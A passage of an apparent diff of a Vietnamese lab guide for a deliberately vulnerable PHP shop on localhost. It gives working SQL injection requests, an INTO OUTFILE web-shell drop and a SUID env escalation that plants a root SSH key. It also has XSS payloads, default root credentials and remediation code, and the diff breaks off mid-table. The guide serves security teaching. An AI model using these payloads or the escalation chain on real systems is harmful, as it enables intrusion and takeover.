+                        <li><strong>Tài khoản Kiểm thử phụ:</strong> <code>test@test.com</code> / Mật khẩu: <code>test123</code> (Role: <code>customer</code>)</li>
+                        <li><strong>Truy cập SSH Máy chủ:</strong> Cổng <code>2022</code> (hoặc <code>2222</code>) &mdash; Tài khoản <code>root</code> hoặc <code>admin</code> / Mật khẩu: <code>123456789</code></li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- ========================================================================= -->
+            <!-- 2. MA TRẬN LỖ HỔNG                                                       -->
+            <!-- ========================================================================= -->
+            <section id="matrix">
+                <h2>2. Ma Trận Lỗ Hổng Bảo Mật (Vulnerability Matrix)</h2>
+                <p>
+                    Lab đã được tái cấu trúc tinh gọn theo yêu cầu giáo trình: <strong>Triệt tiêu toàn bộ các lỗi phụ không liên quan</strong> (như Broken Access Control, Mass Assignment, IDOR) để tập trung 100% vào 2 nhóm lỗ hổng cốt lõi của môn học:
+                </p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Mã Hiệu</th>
+                            <th>Tên Lỗ Hổng Bảo Mật</th>
+                            <th>Phân Loại OWASP</th>
+                            <th>Mức Độ (CVSS)</th>
+                            <th>Điểm Kiểm Thử (Endpoint)</th>
+                            <th>Trạng Thái</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>SQLI-01</strong></td>
+                            <td>Error-Based SQL Injection</td>
+                            <td>A03:2021 - Injection</td>
+                            <td><span class="badge badge-high">HIGH (8.5)</span></td>
+                            <td><code>GET /product?id=...</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>SQLI-02</strong></td>
+                            <td>In-Band UNION-based SQLi</td>
+                            <td>A03:2021 - Injection</td>
+                            <td><span class="badge badge-high">HIGH (8.8)</span></td>
+                            <td><code>GET /product?id=...</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>SQLI-03</strong></td>
+                            <td>Arbitrary File Write (INTO OUTFILE)</td>
+                            <td>A03:2021 - Injection / RCE</td>
+                            <td><span class="badge badge-critical">CRITICAL (9.8)</span></td>
+                            <td><code>GET /product?id=... INTO OUTFILE</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>SQLI-04</strong></td>
+                            <td>Time-based Blind SQL Injection</td>
+                            <td>A03:2021 - Injection</td>
+                            <td><span class="badge badge-high">HIGH (7.5)</span></td>
+                            <td><code>GET /api/store/products?id=...</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>XSS-01</strong></td>
+                            <td>Stored XSS Đánh Giá &amp; Chiếm Cookie Admin</td>
+                            <td>A03:2021 - Injection (XSS)</td>
+                            <td><span class="badge badge-critical">CRITICAL (9.0)</span></td>
+                            <td><code>POST /api/store/reviews</code><br><code>GET /admin/reviews</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>XSS-02</strong></td>
+                            <td>Reflected XSS Tìm Kiếm Sản Phẩm</td>
+                            <td>A03:2021 - Injection (XSS)</td>
+                            <td><span class="badge badge-high">HIGH (7.2)</span></td>
+                            <td><code>GET /search?q=...</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>XSS-03</strong></td>
+                            <td>Stored XSS Qua Upload File Độc Hại</td>
+                            <td>A03:2021 - Injection / Upload</td>
+                            <td><span class="badge badge-high">HIGH (8.0)</span></td>
+                            <td><code>POST /api/member/support/tickets/...</code></td>
+                            <td><span class="badge badge-critical">KHAI THÁC ĐƯỢC</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>BAC-01</strong></td>
+                            <td>Broken Access Control (Admin API)</td>
+                            <td>A01:2021 - Broken Access Control</td>
+                            <td>&mdash;</td>
+                            <td><code>GET /api/admin/customers</code></td>
+                            <td><span class="badge badge-success">ĐÃ VÁ (403 FORBIDDEN)</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>MA-01</strong></td>
+                            <td>Mass Assignment Leo Quyền Admin</td>
+                            <td>A04:2021 - Insecure Design</td>
+                            <td>&mdash;</td>
+                            <td><code>PATCH /api/member/profile</code></td>
+                            <td><span class="badge badge-success">ĐÃ VÁ (ROLE BẢO VỆ)</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>IDOR-01</strong></td>
+                            <td>IDOR Đơn Hàng Thành Viên</td>
+                            <td>A01:2021 - Broken Access Control</td>
+                            <td>&mdash;</td>
+                            <td><code>GET /api/member/orders/:id</code></td>
+                            <td><span class="badge badge-success">ĐÃ VÁ (403 FORBIDDEN)</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- ========================================================================= -->
+            <!-- 3. CHUYÊN ĐỀ 1: SQL INJECTION                                             -->
+            <!-- ========================================================================= -->
+            <section id="sqli">
+                <h2>3. Chuyên Đề 1: Khai Thác Toàn Diện SQL Injection (SQLi)</h2>
+
+                <!-- 3.1 Error-Based -->
+                <div class="card" id="sqli-error">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">1</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">3.1 Error-Based SQL Injection</strong>
+                        </div>
+                        <span class="badge badge-high">Xác định cú pháp lỗi</span>
+                    </div>
+
+                    <p>
+                        <strong>Nguyên nhân kỹ thuật:</strong> Trong phương thức <code>Product::findByIdVulnerable($id)</code> tại <a href="file:///c:/Users/ASUS/Desktop/mid-term/mid-term/vulnerable-ipx/models/Product.php" style="color: var(--primary);">models/Product.php</a>, biến <code>$id</code> nhận từ người dùng qua phương thức GET được nối chuỗi trực tiếp vào câu lệnh SQL không qua bất kỳ cơ chế lọc hoặc Parameterized Query nào:
+                    </p>
+                    <pre><code>$queryExecuted = "SELECT id, name, price, description FROM products WHERE id = " . $id;
+$stmt = $db->query($queryExecuted);</code></pre>
+
+                    <div class="step-box">
+                        <h4>Thao tác kiểm thử bằng Burp Suite / Trình duyệt:</h4>
+                        <p>Gửi ký tự nháy đơn <code>'</code> vào tham số <code>id</code>:</p>
+                        <pre><code>GET /product?id=1' HTTP/1.1
+Host: localhost:3000</code></pre>
+                        <p><strong>Kết quả phản hồi trên giao diện Web:</strong> Khối thông báo lỗi cơ sở dữ liệu xuất hiện ngay trên trang:</p>
+                        <div class="terminal danger">
+[LỖI DATABASE]:
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' at line 1
+                        </div>
+                        <p>👉 <em>Ý nghĩa:</em> Thông báo lỗi trên cho phép khẳng định 100% hệ thống dính SQLi, xác định được DBMS phía sau là MariaDB/MySQL và vị trí lỗi xảy ra ở cuối câu lệnh. Điều này tạo tiền đề vững chắc cho việc xây dựng payload UNION ở bước tiếp theo.</p>
+                    </div>
+                </div>
+
+                <!-- 3.2 UNION SELECT -->
+                <div class="card" id="sqli-union">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">2</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">3.2 In-Band UNION-based SQL Injection</strong>
+                        </div>
+                        <span class="badge badge-high">Trích xuất cấu trúc dữ liệu</span>
+                    </div>
+
+                    <p>
+                        <strong>Xác định số cột bằng kỹ thuật ORDER BY:</strong>
+                    </p>
+                    <pre><code>/product?id=1 ORDER BY 4-- -  &rarr;  HTTP 200 OK (Trang hiển thị bình thường)
+/product?id=1 ORDER BY 5-- -  &rarr;  Lỗi: Unknown column '5' in 'order clause'</code></pre>
+                    <p>👉 Suy ra: Câu truy vấn gốc có chính xác <strong>4 cột dữ liệu</strong> (<code>id, name, price, description</code>).</p>
+
+                    <div class="step-box">
+                        <h4>Trích xuất Tài khoản thực thi và Phiên bản máy chủ CSDL:</h4>
+                        <p>Để ép máy chủ bỏ qua dữ liệu thật của sản phẩm #1 và hiển thị dữ liệu giả lập từ mệnh đề <code>UNION SELECT</code>, ta đặt tham số <code>id=-1</code>:</p>
+                        <pre><code>GET /product?id=-1%20UNION%20SELECT%201,user(),3,@@version--%20- HTTP/1.1
+Host: localhost:3000</code></pre>
+                        <div class="terminal success">
+Dữ liệu trích xuất hiển thị trực tiếp trên giao diện sản phẩm:
+- Mã sản phẩm (Cột 1): #1
+- Tiêu đề sản phẩm (Cột 2): brewcart_user@%
+- Giá niêm yết (Cột 3): 3₫
+- Đoạn mô tả (Cột 4): 10.11.16-MariaDB-1:10.11.16+maria~ubu2204
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 3.3 Chứng minh quyền ghi file -->
+                <div class="card" id="sqli-priv">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">3</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">3.3 Chứng Minh Quyền Ghi File Trong Cơ Sở Dữ Liệu</strong>
+                        </div>
+                        <span class="badge badge-medium">Phân tích secure_file_priv &amp; FILE Privilege</span>
+                    </div>
+
+                    <p>
+                        Để thực hiện ghi file tùy ý (Arbitrary File Write) lên máy chủ thông qua mệnh đề <code>INTO OUTFILE</code>, người kiểm thử cần chứng minh 2 điều kiện tiên quyết:
+                    </p>
+
+                    <ol>
+                        <li>
+                            <strong>Biến hệ thống <code>secure_file_priv</code>:</strong>
+                            <div class="callout callout-warning">
+                                <div class="callout-title">⚠️ Lưu ý kỹ thuật quan trọng về MariaDB / MySQL</div>
+                                <p style="margin-bottom: 4px;">
+                                    Khi máy chủ khởi động với cờ cấu hình <code>--secure-file-priv=""</code> (cho phép đọc/ghi file vào bất kỳ thư mục nào trên hệ điều hành), giá trị trả về của <code>SELECT @@secure_file_priv;</code> trong MariaDB là <strong>chuỗi rỗng <code>""</code> hoặc <code>NULL</code></strong>.
+                                </p>
+                                <p style="margin-bottom: 0;">
+                                    Do đó, nếu học viên gửi lệnh <code>-1 UNION SELECT 1,@@secure_file_priv,3,4-- -</code> thì vị trí tiêu đề sản phẩm sẽ hiển thị <code>NULL</code>. Để ép hiển thị văn bản rõ ràng phục vụ chụp ảnh báo cáo, học viên có thể bọc hàm <code>IFNULL</code>:
+                                </p>
+                            </div>
+                            <pre><code>GET /product?id=-1%20UNION%20SELECT%201,IFNULL(NULLIF(@@secure_file_priv,''),'RONG%20(FULL%20QUYEN%20GHI%20FILE)'),3,@@version--%20- HTTP/1.1
+Host: localhost:3000</code></pre>
+                            👉 <strong>Kết quả:</strong> Tiêu đề sản phẩm in ra dòng chữ: <code>RONG (FULL QUYEN GHI FILE)</code>.
+                        </li>
+                        <li>
+                            <strong>Kiểm tra đặc quyền <code>FILE</code> của User trong <code>information_schema.user_privileges</code>:</strong>
+                            <pre><code>GET /product?id=-1%20UNION%20SELECT%201,GRANTEE,3,PRIVILEGE_TYPE%20FROM%20information_schema.user_privileges%20WHERE%20PRIVILEGE_TYPE='FILE'--%20- HTTP/1.1
+Host: localhost:3000</code></pre>
+                            👉 <strong>Kết quả:</strong> Cột 2 hiển thị <code>'brewcart_user'@'%'</code> và Cột 4 hiển thị chữ <code>FILE</code> &rarr; <em>Minh chứng 100% CSDL có quyền đọc/ghi file hệ thống</em>.
+                        </li>
+                    </ol>
+                </div>
+
+                <!-- 3.4 Ghi file INTO OUTFILE -->
+                <div class="card" id="sqli-outfile">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">4</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">3.4 Tấn Công Arbitrary File Write (INTO OUTFILE)</strong>
+                        </div>
+                        <span class="badge badge-critical">Ghi file lên Web Server</span>
+                    </div>
+
+                    <p>
+                        Do thư mục <code>/app/uploads</code> được gắn kết chung (Volume Mount) giữa container <code>mysql</code> và thư mục web của container <code>vulnerable-app</code> tại <code>/var/www/html/public/uploads</code>, bất kỳ tệp tin nào do MariaDB tạo ra đều được Apache phục vụ trực tiếp qua giao thức HTTP.
+                    </p>
+
+                    <div class="step-box">
+                        <h4>Gửi Payload ghi file kiểm thử:</h4>
+                        <pre><code>GET /product?id=-1%20UNION%20SELECT%201,'Xin%20chao%20thay%20va%20cac%20ban!',3,4%20INTO%20OUTFILE%20'/app/uploads/xin_chao.txt'--%20- HTTP/1.1
+Host: localhost:3000</code></pre>
+
+                        <p><strong>Giao diện phản hồi:</strong> Khối thông báo màu xanh lá xác nhận thành công xuất hiện:</p>
+                        <div class="terminal success">
+[✅ THỰC THI THÀNH CÔNG]
+Mệnh đề INTO OUTFILE đã được máy chủ MariaDB thực thi thành công!
+Tệp tin đã sẵn sàng truy cập tại: http://localhost:3000/uploads/xin_chao.txt
+                        </div>
+
+                        <p><strong>Kiểm chứng kết quả bằng trình duyệt hoặc cURL:</strong></p>
+                        <pre><code>curl -s http://localhost:3000/uploads/xin_chao.txt</code></pre>
+                        <div class="terminal success">
+1	Xin chao thay va cac ban!	3	4
+                        </div>
+                        <p>👉 Tệp tin văn bản đã được tạo trên ổ cứng máy chủ và truy cập công khai 100%.</p>
+                    </div>
+                </div>
+
+                <!-- 3.5 Chuỗi Khai Thác Toàn Diện (ssh_www.py Workflow) -->
+                <div class="card" id="sqli-ssh">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">5</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">3.5 Chuỗi Khai Thác Toàn Diện: SQLi &rarr; Web Execution &rarr; SUID Env PrivEsc &rarr; Root SSH</strong>
+                        </div>
+                        <span class="badge badge-critical">Full Exploit Chain</span>
+                    </div>
+
+                    <p>
+                        Kịch bản thực chiến mô phỏng toàn bộ chuỗi tấn công hoàn chỉnh (Full Attack Lifecycle) từ việc phát hiện lỗ hổng trên tầng Web cho đến khi chiếm toàn quyền điều khiển máy chủ thông qua dịch vụ SSH Server (chuỗi workflow trong <code>ssh_www.py</code>):
+                    </p>
+
+                    <div class="step-box">
+                        <h4>Bước 1 &mdash; Xác nhận điểm tiêm SQL Injection:</h4>
+                        <p>Kiểm tra khả năng inject tham số tại <code>/product?id=1'</code>, máy chủ MariaDB nhả lỗi cú pháp xác nhận điểm chèn hợp lệ.</p>
+
+                        <h4 style="margin-top: 14px;">Bước 2 &mdash; Khai thác SQLi INTO OUTFILE ghi tệp tin lên Web Server:</h4>
+                        <p>
+                            Lợi dụng đặc quyền <code>FILE</code> và cờ <code>secure_file_priv=""</code> của CSDL, kẻ tấn công dùng mệnh đề <code>UNION SELECT</code> để ghi tệp script vào thư mục web công khai <code>/app/uploads/</code>:
+                        </p>
+                        <pre><code>GET /product?id=-1%20UNION%20SELECT%20'&lt;script_code&gt;','','',''%20INTO%20OUTFILE%20'/app/uploads/shell.php'--%20- HTTP/1.1
+Host: localhost:3000</code></pre>
+
+                        <h4 style="margin-top: 14px;">Bước 3 &mdash; Ngữ cảnh thực thi Web (www-data) &amp; Rào cản bảo vệ:</h4>
+                        <p>Khi tệp tin được kích hoạt qua giao thức HTTP, tiến trình thực thi mang danh tính tài khoản dịch vụ mạng:</p>
+                        <div class="terminal info">
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                        </div>
+                        <p>👉 <strong>Rào cản an ninh:</strong> Tài khoản <code>www-data</code> bị hệ điều hành Linux chặn truy cập thư mục của quản trị viên (<code>/root/.ssh/</code>), không thể trực tiếp đọc tệp nhạy cảm hoặc ghi khóa xác thực SSH do bị giới hạn bởi quyền hạn tối thiểu (Discretionary Access Control).</p>
+
+                        <h4 style="margin-top: 14px;">Bước 4 &mdash; Leo thang đặc quyền cài đặt SSH Key qua SUID binary (/usr/bin/env):</h4>
+                        <p>
+                            Người kiểm thử rà soát các tệp tin có cờ SUID trên hệ thống (<code>find / -perm -4000 2&gt;/dev/null</code>) và phát hiện tiện ích <code>/usr/bin/env</code> bị cấu hình sai mang cờ SetUID (<code>-rwsr-xr-x</code>):
+                        </p>
+                        <pre><code>/usr/bin/env id  &rarr;  uid=33(www-data) euid=0(root)</code></pre>
+                        <p>
+                            Nhờ quyền hiệu dụng <code>euid=0(root)</code> từ SUID <code>env</code>, kẻ tấn công vượt qua rào cản phân quyền của <code>www-data</code> và nạp khóa công khai (Public Key) vào tệp xác thực của Root:
+                        </p>
+                        <pre><code>/usr/bin/env install -D -m 600 /tmp/lab_key.pub /root/.ssh/authorized_keys</code></pre>
+                        <p>👉 Tệp <code>/root/.ssh/authorized_keys</code> được tạo lập thành công với chủ sở hữu là <code>root:root</code> và phân quyền chuẩn <code>0600</code>.</p>
+
+                        <h4 style="margin-top: 14px;">Bước 5 &mdash; Chiếm quyền điều khiển Root Shell qua OpenSSH cổng 2022:</h4>
+                        <p>Kết nối trực tiếp vào máy chủ bằng Private Key tương ứng qua cổng SSH mở ngoài Host:</p>
+                        <pre><code>ssh -i lab_key -p 2022 root@localhost</code></pre>
+                        <div class="terminal success">
+root@vulnerable-app:~# whoami; id; hostname
+root
+uid=0(root) gid=0(root) groups=0(root)
+vulnerable-app
+                        </div>
+                        <p>👉 Kẻ tấn công đạt được toàn quyền điều khiển máy chủ (Root Shell) ở mức đặc quyền cao nhất của hệ điều hành.</p>
+                    </div>
+                </div>
+
+                <!-- 3.6 Time-Based Blind -->
+                <div class="card" id="sqli-blind">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">6</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">3.6 Time-based Blind SQL Injection</strong>
+                        </div>
+                        <span class="badge badge-high">Trích xuất dữ liệu mù</span>
+                    </div>
+
+                    <p>
+                        Trên API truy vấn danh sách sản phẩm theo ID <code>GET /api/store/products?id=...</code>, ứng dụng trả về danh sách JSON. Khi câu truy vấn có điều kiện đúng kèm hàm <code>SLEEP()</code>, tiến trình MySQL sẽ hoãn lại phản hồi:
+                    </p>
+                    <pre><code>curl -o /dev/null -s -w "Thời gian: %{time_total}s\n" "http://localhost:3000/api/store/products?id=1"
+Thời gian: 0.02s
+
+curl -o /dev/null -s -w "Thời gian: %{time_total}s\n" "http://localhost:3000/api/store/products?id=1%20AND%20SLEEP(1.5)"
+Thời gian: 1.53s</code></pre>
+                    <p>👉 Độ trễ tăng vọt từ 0.02s lên 1.53s xác nhận kẻ tấn công có thể trích xuất từng bit dữ liệu (Boolean/Time Inference) ngay cả khi ứng dụng không nhả lỗi ra màn hình.</p>
+                </div>
+
+                <!-- 3.7 Phòng thủ SQLi -->
+                <div class="card" id="sqli-defense" style="border-color: var(--green-border);">
+                    <div class="card-header">
+                        <strong style="font-size: 1.15rem; color: var(--green);">🛡️ 3.7 Biện Pháp Khắc Phục Triệt Để SQL Injection</strong>
+                        <span class="badge badge-success">Remediation</span>
+                    </div>
+                    <div class="callout callout-success">
+                        <div class="callout-title">1. Sử dụng Prepared Statements (Tham số hóa truy vấn với PDO)</div>
+                        <p>Tuyệt đối không nối chuỗi biến người dùng vào câu SQL. Sử dụng liên kết tham số:</p>
+                        <pre><code>// Code an toàn:
+$stmt = $db->prepare("SELECT id, name, price, description FROM products WHERE id = :id");
+$stmt->execute([':id' => $id]);
+$product = $stmt->fetch();</code></pre>
+                    </div>
+                    <div class="callout callout-success">
+                        <div class="callout-title">2. Thu hồi đặc quyền FILE &amp; Cấu hình khóa secure_file_priv</div>
+                        <p>Trong môi trường Production, tuân thủ nguyên tắc đặc quyền tối thiểu (Least Privilege):</p>
+                        <pre><code>-- Thu hồi quyền ghi file của tài khoản web:
+REVOKE FILE ON *.* FROM 'brewcart_user'@'%';
+
+-- Khóa biến secure_file_priv trong file cấu hình my.cnf:
+[mysqld]
+secure_file_priv = NULL   # Vô hiệu hóa hoàn toàn lệnh đọc ghi file ngoài DB</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ========================================================================= -->
+            <!-- 4. CHUYÊN ĐỀ 2: XSS                                                      -->
+            <!-- ========================================================================= -->
+            <section id="xss">
+                <h2>4. Chuyên Đề 2: Khai Thác Toàn Diện Cross-Site Scripting (XSS)</h2>
+
+                <!-- 4.1 Stored XSS -->
+                <div class="card" id="xss-stored">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">1</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">4.1 Stored XSS Trên Đánh Giá Sản Phẩm &amp; Chiếm Session Cookie Admin</strong>
+                        </div>
+                        <span class="badge badge-critical">Stored XSS / Session Hijacking</span>
+                    </div>
+
+                    <p>
+                        <strong>Nguyên nhân kỹ thuật:</strong> Khi khách hàng gửi đánh giá sản phẩm tại <code>POST /api/store/reviews</code>, trường <code>body</code> được lưu nguyên vẹn vào CSDL trong bảng <code>reviews</code>. Tại trang quản trị duyệt đánh giá <a href="file:///c:/Users/ASUS/Desktop/mid-term/mid-term/vulnerable-ipx/views/admin/reviews.php" style="color: var(--primary);">views/admin/reviews.php</a>, nội dung được render trực tiếp vào HTML mà không qua hàm escape (<code>htmlspecialchars</code>):
+                    </p>
+                    <pre><code>&lt;!-- Code dính lỗi trong views/admin/reviews.php --&gt;
+&lt;div class="rev-body"&gt;&lt;?= $rev['body'] ?&gt;&lt;/div&gt;</code></pre>
+
+                    <p>
+                        Đồng thời, trong <a href="file:///c:/Users/ASUS/Desktop/mid-term/mid-term/vulnerable-ipx/controllers/AuthController.php" style="color: var(--primary);">controllers/AuthController.php</a>, cookie xác thực phiên <code>session_token</code> được thiết lập <strong>không có cờ <code>HttpOnly</code></strong>:
+                    </p>
+                    <pre><code>setcookie('session_token', $token, [
+    'httponly' => false  // &larr; Cho phép JavaScript trong trang truy cập document.cookie!
+]);</code></pre>
+
+                    <div class="step-box">
+                        <h4>Kịch bản tấn công đánh cắp Cookie:</h4>
+                        <ol>
+                            <li>Đăng nhập tài khoản khách hàng <code>huy@gmail.com</code> và truy cập trang sản phẩm <code>/product?id=1</code>.</li>
+                            <li>Gửi nội dung đánh giá chứa payload XSS:
+                                <pre><code>&lt;img src=x onerror="alert('Cookie Admin bị lộ: ' + document.cookie)"&gt;</code></pre>
+                            </li>
+                            <li>Đăng xuất và đăng nhập tài khoản Quản trị viên <code>admin@gmail.com</code>.</li>
+                            <li>Truy cập trang Duyệt Đánh Giá tại: <code>http://localhost:3000/admin/reviews</code>.</li>
+                            <li><strong>Hiện tượng:</strong> Hộp thoại alert ngay lập tức bật lên hiển thị giá trị <code>session_token=admin-uuid-token...</code>. Kẻ tấn công có thể thay thế lệnh alert bằng mã gửi cookie về server thu thập từ xa để chiếm quyền tài khoản quản trị vĩnh viễn.</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <!-- 4.2 Reflected XSS -->
+                <div class="card" id="xss-reflected">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">2</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">4.2 Reflected XSS Trên Thanh Tìm Kiếm Sản Phẩm</strong>
+                        </div>
+                        <span class="badge badge-high">Reflected XSS</span>
+                    </div>
+
+                    <p>
+                        Tại route tìm kiếm sản phẩm <a href="file:///c:/Users/ASUS/Desktop/mid-term/mid-term/vulnerable-ipx/views/search/index.php" style="color: var(--primary);">views/search/index.php</a>, từ khóa tìm kiếm <code>q</code> được in trực tiếp vào kết quả tìm kiếm trên trang mà không được lọc ký tự đặc biệt HTML:
+                    </p>
+                    <pre><code>&lt;!-- Code dính lỗi trong views/search/index.php --&gt;
+&lt;p&gt;Kết quả tìm kiếm cho từ khóa: &lt;strong&gt;&lt;?= $q ?&gt;&lt;/strong&gt;&lt;/p&gt;</code></pre>
+
+                    <div class="step-box">
+                        <h4>Thao tác kiểm thử:</h4>
+                        <p>Gửi liên kết có chứa mã độc:</p>
+                        <pre><code>http://localhost:3000/search?q=&lt;script&gt;alert('Reflected_XSS_BrewCart')&lt;/script&gt;</code></pre>
+                        <p>👉 Trình duyệt nạn nhân khi mở liên kết sẽ kích hoạt đoạn script độc hại ngay trong ngữ cảnh phiên làm việc của trang web.</p>
+                    </div>
+                </div>
+
+                <!-- 4.3 Upload XSS -->
+                <div class="card" id="xss-upload">
+                    <div class="card-header">
+                        <div>
+                            <span class="step-num">3</span>
+                            <strong style="font-size: 1.15rem; color: var(--text-main);">4.3 Stored XSS Qua Unrestricted File Upload</strong>
+                        </div>
+                        <span class="badge badge-high">MIME-type / Extension Bypass</span>
+                    </div>
+
+                    <p>
+                        Tại tính năng gửi file đính kèm hỗ trợ <code>POST /api/member/support/tickets/1/attachments</code>, hệ thống chỉ lưu file mà không kiểm tra phần mở rộng tệp (Extension Whitelisting). Đồng thời, máy chủ Apache được cấu hình sẵn chỉ thị:
+                    </p>
+                    <pre><code>AddType text/html .html .shtml .xhtml
+AddType image/svg+xml .svg .svgz</code></pre>
+
+                    <div class="step-box">
+                        <h4>Thao tác kiểm thử:</h4>
+                        <p>Gửi request tải lên tệp tin HTML chứa payload XSS:</p>
+                        <pre><code>POST /api/member/support/tickets/1/attachments HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{
+    "filename": "xss_exploit.html",
+    "content": "&lt;html&gt;&lt;body&gt;&lt;h1&gt;XSS Upload&lt;/h1&gt;&lt;script&gt;alert('Stored_XSS_Upload: ' + document.domain)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"
+}</code></pre>
+                        <p>Máy chủ phản hồi đường dẫn tệp đính kèm: <code>/uploads/xss_exploit.html</code>. Khi nạn nhân click vào link, Apache phục vụ tệp với header <code>Content-Type: text/html</code>, khiến mã JavaScript thực thi ngay lập tức.</p>
+                    </div>
+                </div>
+
+                <!-- 4.4 Phòng thủ XSS -->
+                <div class="card" id="xss-defense" style="border-color: var(--green-border);">
+                    <div class="card-header">
+                        <strong style="font-size: 1.15rem; color: var(--green);">🛡️ 4.4 Biện Pháp Khắc Phục Triệt Để Cross-Site Scripting</strong>
+                        <span class="badge badge-success">Remediation</span>
+                    </div>
+                    <div class="callout callout-success">
+                        <div class="callout-title">1. Context-Aware Output Encoding (Mã hóa thực thể HTML)</div>
+                        <p>Mọi biến hiển thị ra giao diện người dùng phải được đưa qua hàm mã hóa chuẩn:</p>
+                        <pre><code>&lt;!-- Code an toàn: --&gt;
+&lt;div class="rev-body"&gt;&lt;?= htmlspecialchars($rev['body'], ENT_QUOTES | ENT_HTML5, 'UTF-8') ?&gt;&lt;/div&gt;</code></pre>
+                    </div>
+                    <div class="callout callout-success">
+                        <div class="callout-title">2. Bật cờ HttpOnly cho Cookie phiên &amp; Triển khai Content Security Policy (CSP)</div>
+                        <pre><code>// Bật cờ HttpOnly ngăn ngừa 100% việc đọc trộm cookie qua JavaScript:
+setcookie('session_token', $token, [
+    'httponly' => true,
+    'secure' => true,
+    'samesite' => 'Lax'
+]);
+
+// Cấu hình header Content-Security-Policy trong Apache hoặc PHP:
+header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ========================================================================= -->
+            <!-- 5. KIỂM TRA CÁC LỖ HỔNG ĐÃ VÁ                                           -->
+            <!-- ========================================================================= -->
+            <section id="fixed-vulns">
+                <h2>5. Kiểm Chứng Các Lỗ Hổng Đã Được Vá Triệt Để</h2>
+                <p>
+                    Để đáp ứng chuẩn mực phân tách lab chuyên đề, hệ thống đã vá và thiết lập cơ chế kiểm soát chặt chẽ cho 3 lỗ hổng cũ:
+                </p>
+
+                <div class="card">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Lỗ Hổng Đã Vá</th>
+                                <th>Cơ Chế Bảo Vệ Đã Cài Đặt</th>
+                                <th>Kết Quả Kiểm Thử</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Broken Access Control</strong></td>
+                                <td>Chặn mọi quyền truy cập vào endpoint <code>/api/admin/*</code> nếu tài khoản không mang vai trò <code>admin</code>. Khách hàng thông thường gọi API sẽ nhận mã lỗi <code>HTTP 403 Forbidden</code>.</td>
+                                <td><span class="badge badge-success">403 FORBIDDEN (PASSED)</span></td>
                             </tr>
                             <tr>
-                                <td>3</td>
-                                <td><strong>Server-Side Request Forgery</strong></td>
-                                <td>SSRF với kỹ thuật bypass bộ lọc danh sách đen bằng Trailing Dot</td>
-                                <td><span class="badge badge-critical">Critical</span></td>
-                                <td><code>POST /api/admin/supplier-sync</code></td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
+                                <td><strong>Mass Assignment</strong></td>
+                                <td>Tại <code>AuthController::updateProfile</code>, sử dụng cơ chế Whitelist chỉ cho phép sửa trường <code>name</code>. Các trường nhạy cảm như <code>role</code>, <code>loyalty_points</code> bị loại bỏ hoàn toàn.</td>
+                                <td><span class="badge badge-success">ROLE GIỮ NGUYÊN CUSTOMER</span></td>
                             </tr>
                             <tr>
-                                <td>4</td>
-                                <td><strong>SQL Injection</strong></td>
-                                <td>Time-based blind SQL injection trên tham số lọc danh mục</td>
-                                <td><span class="badge badge-high">High</span></td>
-                                <td><code>GET /api/store/products?category=...</code></td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
-                            </tr>
-                            <tr>
-                                <td>5</td>
-                                <td><strong>File Upload Vulnerabilities</strong></td>
-                                <td>Tải lên tệp HTML độc hại không giới hạn định dạng đuôi tệp</td>
-                                <td><span class="badge badge-high">High</span></td>
-                                <td><code>POST /api/member/support/tickets/:id/attachments</code></td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
-                            </tr>
-                            <tr>
-                                <td>6</td>
-                                <td><strong>Cross-Site Scripting</strong></td>
-                                <td>Stored XSS thực thi trong phiên duyệt bài của Quản trị viên</td>
-                                <td><span class="badge badge-critical">Critical</span></td>
